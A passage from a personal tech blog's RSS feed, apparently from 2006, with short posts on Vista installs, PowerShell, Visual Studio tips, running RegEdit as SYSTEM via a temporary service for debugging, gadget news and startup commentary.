<p>While some of these features cover far more ground than something like OpenID, this increased scope is needed to ensure that the ID service can be used in all the needed applications. While it is far more complex to add these extra features, the ability to use the resulting ID for almost any purpose makes it well worth it.</p>

<p>I&#8217;m not proposing an alternative to OpenID, simply seeking feedback while passing my feedback on OpenID along for those interested.</p>

      <title>Spam &amp; Gmail</title>
      <description><p>I just dropped by to check my Gmail account (which is almost never used, and the address has never been published anywhere), and found quite a surprise. The spam box currently has <strong>7,026</strong> spam messages!</p>

<blockquote><p><img src="http://adamcaudill.com/files/2006/12/spam.png" alt="Gmail Inbox" /></p></blockquote>

<p>Keeping in mind that spam is deleted after 30 days, that means I&#8217;m getting <em>7,000 spam messages a month</em> to an unknown, unpublished account! All of my other email accounts use two layers of filtering, one at the server, the other in the client. With this much spam going to an almost secret account, I can only image the spam going to my published accounts.</p>

<p>I actively use six separate email accounts, if each gets 7,000 spam messages a month, I&#8217;d be spending my entire week without sleeping just going through spam. Spam just seems that much more evil every day.</p>

      <title>Buying a Car</title>
      <description><p>I recently took a trip down to the <a href="http://www.wallacevolkswagen.com/en_US/">local VW</a> dealership to see what the <a href="http://www.vw.com/jetta/index.html">&#8216;07 Jetta</a>&#8217;s  look like. I was rather <a href="http://www.vw.com/jetta/features_ext.html">impressed</a>. The new Jetta is a very sharp, very sporty car; a rather impressive ride. I had no intention of buying, I just wanted to take one for a test drive.</p>

<p>That is, until I saw a black <a href="http://everything2.com/index.pl?node_id=1404569">Wolfsburg edition</a>. As soon as I saw the car, I knew it was true: love at first sight is real. ;)</p>

<p>After 3-hours and signing a small mountain of papers, I had a new car. Not just a car, my first <em><strong>new</strong></em> car.</p>

<p><strong>Update:</strong> The promised picture (now that Flickr uploading works again):</p>

      <title>Microsoft Visual Studio 2005 Service Pack 1</title>
      <description><p>I must have missed the memo on this, but it seems the first service pack for Visual Studio 2005  has been <a href="http://www.microsoft.com/downloads/details.aspx?FamilyID=bb4a75ab-e2d4-4c96-b39d-37baf6b5b1dc&amp;DisplayLang=en">released</a> (<a href="http://support.microsoft.com/?kbid=928957">release notes</a>). This release should add a lot of stability to the IDE and resolve of number of issues (such as the frequent VB compiler crashes). It&#8217;s a rather large download, approximately 450 MB, and is rather slow to install, but it promises to be well worth it.</p>

<p>The one real downside, is that you shouldn&#8217;t plan on doing much while it&#8217;s installing; the almost 400 MB of RAM consumed during parts of the installation may slow your system to a crawl. So, make plans to do something else while it&#8217;s working, because you wont be.</p>

      <title>Things You Shouldn’t Worry About</title>
      <description><p>I&#8217;ve been a fan of <a href="http://microisvjournal.wordpress.com/">Patrick&#8217;s blog</a> for some time now, and one of his recent articles, <a href="http://microisvjournal.wordpress.com/2006/12/05/things-you-shouldnt-worry-about/"><em>Things You Shouldn’t Worry About</em></a>, really shines. While I can&#8217;t agree with everything, most of the points really make sense. If you run an ISV, or are thinking about starting one, I highly recommend that you read this, it&#8217;s well worth it.</p>

      <title>Yes, I am alive!</title>
      <description><p>My blog has been rather quiet recently, largely due to a project I&#8217;ve been working on for one of the largest banks in the country. The project, a dynamic, script-able, plug-in driven data capture system, has finally been released and is in production. I&#8217;ll not bore you with any of the details, so I&#8217;ll get right to the point:</p>

<p><strong>I&#8217;ve got a life again!</strong></p>

<p>Well, at least as much of a life as a developer / technologist / workaholic ever has. ;) I should be back to posting on a more regular schedule now, sorry for the extended silence.</p>

      <title>Want a free copy of Vista?</title>
      <description><p>Microsoft is currently running a promotion for <a href="http://www.powertogether.com/">free copies of Vista Business Edition and Office 2007 Professional</a>. The deal looks a bit like this: You watch 3 videos, answer some questions about the videos, then fill out a form with a bunch of personal information. Sounds to me like a great deal. This is quite similar to a promotion some time back for a <a href="http://adamcaudill.com/2006/03/17/microsoft-visual-studio-2005-free/">free copy of Visual Studio</a>.</p>

<p>Here&#8217;s the downside: If you are a member of the Microsoft Partner Program, or Microsoft Developer Network (MSDN), you aren&#8217;t eligible for these offers.</p>

<p>The site is currently loading very slowly, as it seems word of this offer is spreading fast. Once I get more information on this, I&#8217;ll pass it along.</p>

<p><em>Update:</em> I forgot to mention, this offer is only open to US residents.</p>

      <title>The Optimus Ghost-town</title>
      <description><p>For those of you that have followed the famous (or now infamous) <a href="http://www.artlebedev.com/everything/optimus/">Optimus</a> keyboard, the project has just <a href="http://community.livejournal.com/optimus_project/11850.html">lost a major feature</a> (the latest in a <a href="http://community.livejournal.com/optimus_project/5448.html">series</a> of <a href="http://community.livejournal.com/optimus_project/11493.html">many</a> to be <a href="http://community.livejournal.com/optimus_project/10902.html">cut</a>) that will substantially cut into the number of people who would buy one. In a few short words, many lost interest:</p>

<blockquote><p><em><strong>Optimus-103 will use black and white displays </strong></em></p></blockquote>

<p>The once great design has now crumbled into a shadow of its former self. Sporting few of the features once promised, the current design has alienated many of the loyal supporters and made many vow to not buy the product. While the Optimus has lost much of its glory due to these feature cuts, it is still a revolutionary product.</p>

<p>While personally I&#8217;m very disappointed that I may never have the Optimus I fell in love with a couple years ago, it&#8217;s still a great idea, and still a unique product. They may have failed to delivery for now, but maybe someday, maybe.</p>

      <title>Fiddler2 - Now Available</title>
      <description><p>A new version of the popular debugging proxy <a href="http://www.fiddlertool.com/fiddler/">Fiddler</a> has been <a href="http://insidehttp.blogspot.com/2006/11/fiddler2-experimental-edition.html">announced</a>. The new version, dubbed <a href="http://www.fiddlertool.com/Fiddler2/">Fiddler2</a>, adds support debugging HTTP<strong>S</strong> traffic just as you would unsecured HTTP traffic. Per the <a href="http://www.fiddlertool.com/fiddler2/faq.asp">FAQ</a>s, this new version effectively runs a <a href="http://en.wikipedia.org/wiki/Man_in_the_middle_attack">MITM</a> attack to do its job, while this is the most effective way of doing this, there is the downside of the browser showing an error, though you should be able to continue by ignoring these warnings.</p>

<p>If you develop or maintain secure web sites, this enhanced version of Fiddler will be a great help. Though this is still an alpha version, it&#8217;s based on a fairly stable code base and seems to work well. This is one to keep an eye on.</p>

      <title>Installing Vista</title>
      <description><p>I installed Vista last night twice; the first was an upgrade from XP Pro on my laptop, the other a fresh install on my desktop. The experience was quite interesting for both; here are a few thoughts about the process:</p>

<p><strong>Laptop</strong></p>

<p>My laptop has a fairly modest configuration, 1.73GHz Pentium M, 512MB, 80GB hard-drive, and Mobil Intel 915 64MB for the graphics. It&#8217;s been running Windows XP Pro, last night I went through the upgrade process to Vista Business. It checking for compatibility it found a couple applications it had issues with, but it seems it wasn&#8217;t happy just telling me that they might not work, but they had to be removed before I could go on.</p>

<p>This required exiting setup and uninstalling both Nero and the freshly released Windows PowerShell so that I could continue. Once the offending applications were removed, I started the process again (including the 15 minute compatibility check). From here on, the process went well, although surprisingly slow. From start to first boot into Vista was a bit over three hours.</p>

<p>Once Vista was finally running I had my first taste of Vista, as I had not installed the betas, this was the first time I had used it. The first few minutes were full of disappointing surprises, such as the two INI files adorning my desktop, or the new &#8216;home&#8217; folder full of permission errors and various configuration files. It&#8217;ll take me a fair bit of time to clean my hard drive up from that, it&#8217;s really quite a mess. On the upside, pretty much all of my software worked fine, except for the various drivers and utilities to adjust things just as power profiles and wireless network settings, but Vista includes enough to cover the functionality of everything that stopped working.</p>

<p>Impression: Overall positive, it&#8217;s a nice operating system, but I&#8217;m disappointed in how long it&#8217;ll take to get things cleaned up, get the permissions corrected and back to a similar setup to what I had before.</p>

<p><strong>Desktop</strong></p>

<p>My desktop is a bit more beefy, but still nothing special, it looks something like this: 3.0GHz Pentium 4, 1.0GB of RAM, 80GB system hard-drive (plus a separate data drive), nVidia GeForce MX4000 128MB (PCI) and a ATI Radeon 7000 64MB (AGP). This box was also running XP Pro and had been in need of rebuilding for a couple months at least.</p>

<p>This was a fresh install, and surprisingly quick. I made it to the first boot into Vista in around an hour, a third of the time required for the upgrade. This one went a fair bit smoother than the upgrade process and seems to be a fairly pleasant one. Once the system was up and running, I found the file system to be a fair bit cleaner than the upgrade produced.</p>

<p>Among the first things I checked was the &#8216;Experience Index&#8217; to see where my computer ranks, and what the odds would be of getting Aero working. With a grand score of 1.0, I knew that wouldn&#8217;t happen. So, I check and sure enough my hunch was right, it was my graphics cards that were to blame. Me being the geek I am, I had to have Aero, so a 10PM run to the local Best Buy, and picked out a <a href="http://www.bestbuy.com/site/olspage.jsp?skuId=7634713&amp;st=x1600&amp;type=product&amp;id=1130987912328">ATI Radeon X1600 Pro</a>. I figured this card would have plenty of power for Aero.</p>

<p>Thankfully, Windows was able to identify a driver so I didn&#8217;t have to do any searching. All I had to do was reboot, and there was Aero, in all its glory. If you&#8217;ve not seen Aero yet, you don&#8217;t know what you&#8217;re missing. This new shell is great, very different, but really nice.</p>

<p>Impression:  Quite positive, much better than the upgrade. System is stable and almost all of my normal software is working. If you&#8217;re going to install Vista, make sure your box has some beef, and start fresh. I&#8217;d advise against doing the upgrade, while it does work, it leaves a bit of a mess.</p>

      <title>Power Users, Rejoice!</title>
      <description><p>At long last, Windows has a real, <a href="http://www.microsoft.com/windowsserver2003/technologies/management/powershell/default.mspx">power user&#8217;s shell</a>; and it&#8217;s been <a href="http://blogs.msdn.com/powershell/archive/2006/11/14/windows-powershell-1-0-released.aspx">officially done</a>. PowerShell is the new, highly flexible and extremely powerful shell for Windows (XP SP2+). From my first experiences with it, I&#8217;m quite impressed. This is a great tool for developers, system administrators, and just about any other power user.</p>

<p><img src="http://adamcaudill.com/files/2006/11/powershell.png" alt="PowerShell" /></p>

<p>While PowerShell doesn&#8217;t offer the power or flexibility that a traditional *nix shell does, the power is impressive. I&#8217;ve been looking forward to this being released, now that I&#8217;ve played with it, I&#8217;ve even more excited. This is a great tool, just trust me, <a href="http://www.microsoft.com/windowsserver2003/technologies/management/powershell/download.mspx">get it</a>, you need it.</p>

      <title>Monkey Powered Search Engine</title>
      <description><p>We all know that Google is <a href="http://www.google.com/technology/pigeonrank.html">PigeonPowered</a>™ - now, we have a search engine ran by trained monkeys. Well, not exactly monkeys, but <em>semi-trained</em> people. Yes, you heard that right. When you do a search, it doesn&#8217;t hit some massive database containing every web page known to man, it goes to a human for them to figure out.</p>

<p>If I didn&#8217;t know better, I&#8217;d call it an <a href="http://en.wikipedia.org/wiki/April_Fool's_Day">April-fools&#8217;</a> joke. But, alas, it&#8217;s not.</p>

<p>Here&#8217;s how it works: You type your query in a very <a href="http://www.chacha.com/">Google-like homepage</a>, but when you hit &#8216;Search with Guide&#8217; (pressing &#8216;enter&#8217; will get you a glorified set of <a href="http://www.infospace.com/home/search/index.htm">InfoSpace</a> results) instead of getting a list of results, you get a chat window. In that chat window you can tell the guide more about your search, and you might, <a href="http://www.downloadsquad.com/2006/11/11/cha-cha-launches-in-beta-with-real-live-search-guides/">eventually</a>, get an answer. While there is some value to a human edited directory such as <a href="http://dmoz.org/">DMOZ</a>, I can&#8217;t see a human built search engine working out.</p>

<p>I have to wonder how this will work out from the business side, this doesn&#8217;t seem to be the greatest business model, as it can&#8217;t be cheap to have an army of people sitting around searching for other people. It looks like their business model is based around <a href="http://www.chacha.com/info/advertisers">selling ads</a>, and while that is a high profit market, I can&#8217;t see it being enough to cover the expense of having the guides. It&#8217;ll be interesting to see how long they last.</p>

<p>Sorry for the rant, but I found this one just too odd to ignore.</p>

      <description><p>Yup, <a href="http://www.netfx3.com/blogs/news_and_announcements/archive/2006/11/06/.NET-Framework-3.0-has-been-released_2100_.aspx">it&#8217;s here</a>! The next version of the .NET Framework has been released, while this isn&#8217;t a major release (as not much has changed), it is a milestone. This release adds support for the WPF, or Windows Presentation Foundation, the new presentation framework that will enable a new generation of remarkable interface designs.</p>

<p>If you&#8217;re a developer, get going and get started - this is going to be fun. :)</p>

      <title>What Motivates Developers?</title>
      <description><p>Developers have jobs for the money, right? If you want a developer to work hard, give them more money, right? <strong>Wrong</strong>. For many developers, money has little effect on motivation.</p>

<p>Being an odd creature anyhow, developers are a bit different in that the things most people seek in a job means little to most developers. A developer is motivated by a completely different set of factors, and I believe I&#8217;ve ran across a great definition of the things that really matter.</p>

<p>Rob Walling offers great insight in &#8221;<em><a href="http://www.softwarebyrob.com/articles/Nine_Things_Developers_Want_More_Than_Money.aspx">Nine Things Developers Want More Than Money</a></em>&#8221; - this is a great read, and I recommend it highly for both those that write code, and those that manage those that write code. For that matter, I highly recommend this for everybody, read it.</p>

      <description><p>I just ran across an <a href="http://www.mstechtoday.com/2006/10/29/microsoft-announces-new-accounting-software-and-service/">announcement</a> for a new Microsoft product, <a href="http://www.ideawins.com/index.html">Office Accounting 2007 Express</a>. This is a <em>free</em>, and surprisingly full featured accounting package aimed at small businesses.

      <title>Vertical Column Indicator for Visual Studio</title>
      <description><p>The coding guidelines at my job have a rather interesting requirement: code must be wrapped at 100 characters. If you fail to meet this on any line of code, you fail the code review. In the year I&#8217;ve worked at this company I&#8217;ve learned to guess how long a line is quite well. As of today, no more guessing.</p>

<p>Here&#8217;s a quick registry hack to add a vertical line in the editor at any column you wish, just double click the <a href="http://adamcaudill.com/files/2006/10/vscolumnline.zip">REG file</a> and you&#8217;re set. The contents of the file look something like this:</p>

<pre><code>Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\VisualStudio\8.0\Text Editor]
"Guides"="RGB(128, 128, 128) 100"

[HKEY_CURRENT_USER\Software\Microsoft\VisualStudio\7.1\Text Editor]
"Guides"="RGB(128, 128, 128) 100"`
</code></pre>

<p>The setting works something like this: The <code>RGB()</code> part defines the color of the line, the number at the end defines the column the line is displayed at. If your style defines a limit on the length of a line, this is a great way to see at a glance if you&#8217;re going too long.</p>

<p><em>Note:</em> This adds the key for both Visual Studio 2003 and Visual Studio 2005.</p>

<p><strong>Update:</strong> The original REG file I linked to had a formatting error that caused the data to import improperly. I&#8217;ve replaced the file with a working copy.</p>

      <title>Site Updates</title>
      <description><p>This weekend I&#8217;ve made a few upgrades to the site, a software upgrade, a few new plugins as well as some tweaks to clean things up. Hopefully these changes will make the site a bit more useful, and remove some clutter from the main page, so that you are presented with content, and all the &#8216;extras&#8217; will be tucked away.</p>

<p><strong>WordPress 2.0.5</strong></p>

<p>I&#8217;ve upgraded to the newly released <a href="http://wordpress.org/development/2006/10/205-ronan/">WordPress 2.0.5</a>, the software that power this site. As a rule, WordPress is an extremely easy install. This upgrade would have been simple, had I not forgotten about a few core files that I modified. After reverting to the previous version, I had the files patched and uploaded within a few minutes.</p>

<p>All in all, this process went quite well. The database performance updates made the install well worth it.</p>

<p><strong>New Plugins</strong></p>

<p>I&#8217;ve added a couple new plugins to add some additional functionality, here&#8217;s the list:</p>

<ul>
<li><p><a href="http://codex.wordpress.org/Plugins/Auto_shutoff_comments">Auto Shutoff Comments</a> - This is a handy plugin that closes comments after 30-days, this will help cut-back on the spam that comes through.</p></li>
<li><p><a href="http://codex.wordpress.org/Plugins/Auto_shutoff_comments">Related Posts</a> - This, <em>in theory</em>, adds links to similar posts below each post (when viewed on its own page, not on the home page). So far I&#8217;ve not been completely impressed with the links, but I&#8217;ll leave it for a while and see how it does.</p></li>
<li><p><a href="http://push.cx/sociable">Socible</a> - This is one I really had to debate, there&#8217;s not much more I hate than sites that remind  me of a <a href="http://www.codinghorror.com/blog/archives/000587.html">NASCAR race car</a>. I&#8217;ve set this up to only display on the single post view, and will only offer Reddit, digg and del.icio.us. This is another one I&#8217;ll keep for a bit then see if it&#8217;s worth keeping around.</p></li>
</ul>


<p><strong>New Content &amp; Cleanup</strong></p>

<p>I&#8217;ve rebuilt my <a href="http://adamcaudill.com/about/">about page</a> to include some addition data and take a more readable format. I&#8217;ve also added a new page that details my <a href="http://adamcaudill.com/bayonet-collection/">bayonet collection</a>. To clean things up slightly, I&#8217;ve updated the code that adds the Technorati tags so that it will only show in the single post view, and no longer appear on the main page.</p>

      <title>Optimus: First Sign of Life</title>
      <description><p>Those of you that are into computer gadgets have surely heard of the now quite famous <a href="http://www.artlebedev.com/everything/optimus/">Optimus keyboard</a> - the (once) OLED powered keyboard that has caused quite a stir. Recent, word came from the team that <a href="http://community.livejournal.com/optimus_project/1775.html">Optimus will not be using OLEDs</a>, the belief since then is that it will use LCD instead. Well, after many, many months of waiting to see proof that Optimus will live, <a href="http://community.livejournal.com/optimus_project/6313.html">finally, we see a key</a>.</p>

<blockquote><p><a href="http://adamcaudill.com/files/2006/10/optikeylite.jpg"><img src="http://adamcaudill.com/files/2006/10/optikeylite.thumbnail.jpg" alt="Optimus Key Preview" /></a></p></blockquote>

<p>This is the first real sign of life, and I believe a good indicator that we will indeed see it released. Personally, I can&#8217;t wait. I&#8217;m hoping that we&#8217;ll see more soon.</p>

      <title>Internet Explorer 7 Released</title>
      <description><p>For those of you that are interested, <a href="http://blogs.msdn.com/ie/archive/2006/10/18/internet-explorer-7-for-windows-xp-available-now.aspx">IE7 has been released</a>. After following the progress of the next generation of IE since March of last year, I&#8217;ve got to say, I&#8217;m really excited to see it go public. The only real surprise for me with this announcement is that many expected the Mozilla Foundation to release Firefox 2.0 prior to Internet Explorer&#8217;s big release, yet no word from them. I&#8217;m wondering if there were more issues in the <a href="http://www.downloadsquad.com/2006/10/09/firefox-2-rc2/">RC2 release</a> that delayed the launch.</p>

<p>It&#8217;s good to know that the security and compatibility issue of the older versions of IE can now fade away into the past (where they belong).</p>

      <description><p>For those looking to get into the startup/ISV scene, Paul Graham&#8217;s latest work is a great read. <a href="http://paulgraham.com/startupmistakes.html">The 18 Mistakes that Kill Startups</a> takes an interesting look at some of the larger issues to avoid while forming a new company.

      <title>bbPress Released</title>
      <description><p>After 2 years, my <a href="http://bbpress.org/">favorite forum software</a> has been <a href="http://bbpress.org/blog/2006/10/bbpress-072/">officially released</a>. I&#8217;ve been a big fan of bbPress since it&#8217;s early days, I even had at least one patch accepted. So I guess one could say I was a developer on the project (although, a very minor one).</p>

<p>It&#8217;s great to see this project make it. If you&#8217;re looking for high-quality PHP-based forum solution without the weight of something like <a href="http://www.vbulletin.com/">vB</a>, then bbPress is the answer.</p>

      <title>Final Vista Public Beta Released</title>
      <description><p>The final public beta build (5744) of the next generation of Windows has been <a href="http://blogs.technet.com/windowsvista/archive/2006/10/06/Windows-Vista-RC2-is-now-available-to-technical-beta-testers_2100_.aspx">released</a> (via <a href="http://shellrevealed.com/blogs/externalnews/archive/2006/10/06/Windows-Vista-RC2-Build-5744-Released.aspx">shell: revealed</a>). With this announcement it looks like Vista will indeed be on time. For awhile I was wondering if Vista had any chance of making it, but it seems that it will indeed. While this is certainly good news, the RTM build is the one that has my interest.</p>

<p>Playing with a release candidate can be fun, there&#8217;s no doubt about it; but the real fun starts when you can see how things work and behave on the final - (hopefully) working build. I&#8217;ve got a ton of software to test, and a number of applications to update to take advantage of the latest goodies Vista offers - that&#8217;s the fun part.</p>

      <title>Not a good idea&#8230;</title>
      <description><p>I&#8217;ve been both a subscriber and fan of <a href="http://valleyschwag.com/">Valleyschwag</a> since it was launched, that is, until yesterday. And not by my choice mind you, they <a href="http://valleyschwag.com/chronicles/2006/10/03/changes-are-afoot-at-valleyschwag/">canceled</a> <em>everybodies</em> subscription. When the second issue was <a href="http://adamcaudill.com/2006/05/26/the-schwag-has-shipped/">shipped</a> in late May, they reported having over 1,500 members each paying $15 a month for the service. I can only guess what the subscriber count would look like now, after having a few months to grow.</p>

<p>They&#8217;ve thrown that all away now, sending the following notice to all the subscribers:</p>

<blockquote><p>_&#8221;We&#8217;d like you to be one of the first to know that we will soon unveil the Valleyschwag General Store, where you will be able to purchase future issues of our famous schwag bags. And by popular demand, we will be offering some of our most requested schwag items for sale. _</p></blockquote>

<p>_This store replaces our subscription service, giving you more control over the issues and items you&#8217;d like to receive. We will notify you by email when a new issue of Valleyschwag is available, giving you the first opportunity to place an order at the General Store. _</p>

<p><em>Since a subscription is no longer required <strong>we will automatically cancel your Paypal subscription</strong> if you haven&#8217;t already done so. To accomodate our members around the globe, the store will continue to accept Paypal as well as credit cards for all purchases.&#8221;</em></p>

<p>That&#8217;s right, they are now hoping that by sending out reminders and canceling the automatic payments, they will be able to stay afloat. They had guaranteed money in the bank every month, now, they&#8217;ll have to hope that people will remember to take time out of their busy day to buy the next issue. I don&#8217;t think they&#8217;ll see near the numbers they could with the subscription model.</p>

<p>One of the things I like about any subscription is that you don&#8217;t have to think about it, it <em>just works</em>. Once a month or so I get a package, no forms to fill out, no remembering to check and see if the next issue is ready, it&#8217;s <em>just there</em>. I think a lot of people feel this way, and I think this will be rather painful for the ValleySchwag team, and endanger the future of the business itself.</p>

<p>Valleyschwag was a really interesting concept, but I have to believe it grew too large, too quickly for the model to work. I wish the guys at <a href="http://rubyredlabs.com/">RubyRed</a> the best, but I believe the end is coming for the schwag express.</p>

      <title>A look into Vista</title>
      <description><p>Ever wondered how they do things inside of Microsoft? As a developer that makes extensive uses of Microsoft technologies and tools, I&#8217;m always interested in an insight into their development process. Well, if you&#8217;re like me, then I may have a real treat for you.</p>

<p><a href="http://www.pasceri.com/about_me/index.html">Vinny Pasceri</a>, the <a href="http://www.microsoft.com/windowsvista/experiences/aero.mspx">AERO</a> Program Manager for Microsoft has posted an <a href="http://shellrevealed.com/blogs/shellblog/archive/2006/09/26/A-look-into-the-feature-design-process.aspx">great insight</a> on the (<a href="http://www.downloadsquad.com/2006/09/20/windows-ui-team-has-a-blog/">fairly new</a>) <a href="http://shellrevealed.com/">Windows Client Team Blog</a>. This is a great peak into what the design process looks like, and even includes what may be the first publicly released <a href="http://shellrevealed.com/files/folders/specs/entry2770.aspx">feature spec</a>. This makes for a great read, I highly recommend taking a close look at this article and the included spec.</p>

      <title>EventArgs: No need to pass a new Instance</title>
      <description><p>If you look at the code I write, seeing a line similar to the following would be fairly common:</p>

<p><code>RaiseEvent LoadComplete(Me, New EventArgs)</code></p>

<p>Yesterday, I wouldn&#8217;t have given this a second thought, but today, the story is a bit different. A friend of mine pointed me to an <a href="http://msdnwiki.microsoft.com/en-us/mtpswiki/118wxtk3(vs.80">interesting comment</a>.aspx#CommunityContentAnchor)  by <a href="http://davidkean.net/">David Kean</a>  (from Microsoft) on the <a href="http://msdnwiki.microsoft.com/en-us/mtpswiki/default.aspx">MSDN Wiki</a>  indicating that the line above is actually <em>wrong</em>!</p>

<p>So, based on his comment, I should be using <a href="http://msdn2.microsoft.com/en-us/library/system.eventargs.empty.aspx">EventArgs.Empty</a>  instead of creating a new instance, something like this:</p>

<p><code>RaiseEvent LoadComplete(Me, EventArgs.Empty)</code></p>

<p>So using <code>EventArgs.Empty</code> must be better somehow, so I decided to take a look and see if I could figure out just what the difference would be. The MSDN states that &#8221;<em>The value of Empty is a read-only instance of EventArgs equivalent to the result of calling the EventArgs constructor</em>&#8221; - so what&#8217;s the difference? Time for a trip into the <a href="http://www.aisto.com/roeder/DotNet/">Reflector</a>.</p>

<p>The Reflector shows two constructors:</p>

<p><code>Public Sub New()  
End Sub</code></p>

<p><code>Shared Sub New()  
EventArgs.Empty = New EventArgs  
End Sub  
</code></p>

<p>So, <code>EventArgs.Empty</code> just calls <code>New EventArgs</code> and returns that. <em>Right</em>.</p>

<p>Anybody see something there that I&#8217;m missing? Seems to me that the somewhat more verbose, but more clear (as to what is actually happening) syntax would be better, and no less efficient. If anybody has an opinion about why you would do one instead of the other, I&#8217;d like to hear it.</p>

      <title>Make XP Pretty</title>
      <description><p>While going through my (long) list of RSS-feeds that I monitor, I found this gem of an article: <a href="http://www.downloadsquad.com/2006/09/23/vista-transformation-pack-vista-ize-your-xp/">Vista Transformation Pack: Vista-ize your XP</a>. The <a href="http://www.windowsxlive.net/?p=137">Vista Transformation Pack</a> is a clever little application that moves your XP desktop several steps closer to the beauty that is Vista. While the &#8216;transformation&#8217; doesn&#8217;t give you all of the new UI goodies that come with Vista, it does add a fair bit of eye candy.</p>

<p>I&#8217;m not typically one to promote UI tweaks like this, but after playing with the settings, I&#8217;ve now have a great looking setup without the instability that still goes with Vista.</p>

      <title>VB.NET 2005 Interop Toolkit</title>
      <description><p>The <a href="http://blogs.msdn.com/vbteam/">VB Team</a> has just <a href="http://blogs.msdn.com/vbteam/archive/2006/09/20/763986.aspx">announced</a> the release of a <a href="http://msdn.microsoft.com/vbasic/downloads/powerpacks/interopforms/default.aspx">VB.NET / VB6 Interop toolkit</a>, complete with source. For those of us that work in shops that still maintain a fair number of legacy applications, this could be quite useful. Here&#8217;s the description straight from Microsoft:</p>

<blockquote><p><em>The Interop Forms Toolkit 1.0 is a free add-in that simplifies the process of displaying .NET WinForms in a Visual Basic 6 application. Instead of upgrading the entire code base, these applications can now be extended one form at a time. The goal is a phased upgrade, with production releases at the end of each iteration containing both Visual Basic 6 and Visual Basic .NET forms running in the same Visual Basic 6 process. </em></p></blockquote>

<p>My favorite thing about this release is the inclusion of the source code* - I always love taking a peak at how MS writes code. As a side note to all this, this is just one part of the new <a href="http://msdn.microsoft.com/vbasic/downloads/powerpacks/default.aspx">Visual Basic 2005 Power Pack</a>, a collection of controls, components and add-ins - all free. This is one worth looking at.</p>

<ul>
<li><p>Note: You&#8217;ll find the source if you take a look in this folder:</p>

<p>  X:\Program Files\Microsoft Visual Basic 2005 Power Packs\Interop Forms Toolkit 1.0\SDK\Source</p></li>
</ul>

      <title>Running RegEdit as SYSTEM</title>
      <description><p>While facing an interesting research challenge, digging into the inner working of Windows, I realized that I needed to change a registry value. That&#8217;s simple enough, I fire up RegEdit, make the change, then politely as RegEdit knows how, it told me that I <em>couldn&#8217;t change the value</em>! Being one that hates when <em>my</em> computer tells <em>me</em> I can&#8217;t do something, I had to find another option.</p>

<p>So after some research, I found my answer: <a href="http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/sc.mspx?mfr=true">sc</a>. This is a great little utility (included with Windows), and made the task of running an application as SYSTEM*  much easier. At this point some of you may be wondering why I didn&#8217;t just use <a href="http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/runas.mspx?mfr=true">RunAs</a> instead, as it&#8217;s designed to allow execution as another user. Well, from all that I&#8217;ve found, there is no way to get RunAs to spawn a process as SYSTEM, one of the downsides of SYSTEM not being a true user.</p>

<p>Another option that I found (somewhat) attractive initially is <a href="http://www.codeproject.com/system/RunUser.asp">RunAsEx</a>, an open source, GUI based version of RunAs. This could be useful, but I found it to be more hassle than it was worth. Still might be useful for somethings, but with all the bugs I found in it, I knew there was a better way.</p>

<p>Now, back to the solution I chose: Using sc to create a service that will execute the application I&#8217;m after. This works because by default all services execute under the SYSTEM user context, so all we have to do is create a service to call the application we need. Surprisingly simple, and it works quite well.</p>

<p>Creating the service looks something like this:</p>

<p><code>SC CREATE AcDebugSvc binPath= "regedit.exe" type= own type= interact</code> <em>**</em></p>

<p>This creates the service, so that now all you have to do is start the service (<code>SC START AcDebugSvc</code> ***) and you&#8217;ll see your copy of RegEdit. If you check in Task Manager, you&#8217;ll be able to confirm that it is actually running as SYSTEM. This is an extremely powerful debugging tool, as it allows you to instantly execute any application as the most powerful user that Windows offers.</p>

<p>Once you are done with your work, just delete the service (<code>SC DELETE AcDebugSvc</code>) and call it a day, that simple. This can also easily be scripted if you tire of typing the commands so often, and it can also be used with most applications. Using this for the Command Prompt (<code>binPath= "cmd.exe /K start"</code>) and for Task Manager (<code>binPath= "taskmgr.exe"</code>) both strike me as being quite useful.</p>

<ul>
<li><strong>WARNING</strong>: As I hope most of you know, System is a very powerful account, it&#8217;s almost limitless in what it can do. If you aren&#8217;t careful while working under this user context; you may end up with a rather expensive paperweight instead of a computer. You have been warned.</li>
</ul>


<p>** Note: As odd as it is, the spaces after the equals and before the value of the parameters is quite important, the call will fail if you omit them.</p>

<p>*** Note: You&#8217;ll get an error message (&#8221;<code>The service did not respond to the start or control request in a timely fashion.</code>&#8221;) when you call this, it&#8217;s nothing to worry about. The reason that it occurs is that to respond to the message it receives the target application must be designed to operate as a service. Since we are using this for other purposes we, we don&#8217;t really care.</p>

      <description><p>While my favorite browser will always be <a href="http://www.opera.com/">Opera</a>, I&#8217;m a big fan of <a href="http://www.mozilla.com/firefox/">Firefox</a>; its amazing selection of add-ons (a feature that Opera sadly lacks) adds much to its value for me. With the addition of plug-ins like the excellent <a href="http://chrispederick.com/work/webdeveloper/">Web Developer</a> add-on, Firefox becomes a powerful development and browsing platform.</p>

<p><a href="http://adamcaudill.com/files/2006/09/sc37757375032.png"><img src="http://adamcaudill.com/files/2006/09/sc37757375032.thumbnail.png" alt="ErrorZilla" /></a> I just learned of a new add-on released by Eric of <a href="http://roachfiend.com/">roachfiend.com</a> called <a href="http://roachfiend.com/archives/2006/08/28/errorzilla-useful-error-pages-for-firefox/">ErrorZilla</a>, this is a great idea. It&#8217;s a replacement for the default Firefox error pages, new error pages with additional features. Here&#8217;s the quick run-down of the new options presented:</p>

<ul>
<li><p>Try again (refresh)</p></li>
<li><p>Google Cache</p></li>
<li><p>Wayback</p></li>
<li><p>Ping</p></li>
<li><p>Trace</p></li>
<li><p>Whois</p></li>
</ul>


<p>Now, when faced with a dreaded &#8220;Server not found&#8221; error, it&#8217;s much easier to find <em>some</em> useful information. When researching a topic, there&#8217;s nothing worse than having to go in circles trying to find a page that will load, this add-on is certainly a step in the right direction. I really hope that the Firefox developers see this add-on and consider adding this or similar functionality to the distribution.</p>

      <title>Kill CapsLock!</title>
      <description><p>Most people I know have issues with the CapsLock key; with feelings ranging from annoyance to sheer hatred. More often than not, I fall into the sheer hatred side of things. I&#8217;ve played with various ideas to solve the problem. Everything from a system tray notification when CapsLock is on, to physically removing the evil key itself. After all these attempts, I have found I like none of them.</p>

<p>Enter <a href="http://winadmin.forret.com/registry/wanocaps/">waNOCAPS</a> (from the <a href="http://winadmin.forret.com/">Winadmin tools</a> project), a registry modification to quickly and cleanly remap the CapsLock to a third Ctrl key. This is nice in that it&#8217;s a simple registry change, not something as ugly as a background program to alter the CapsLock state or value as many CapsLock killers use.</p>

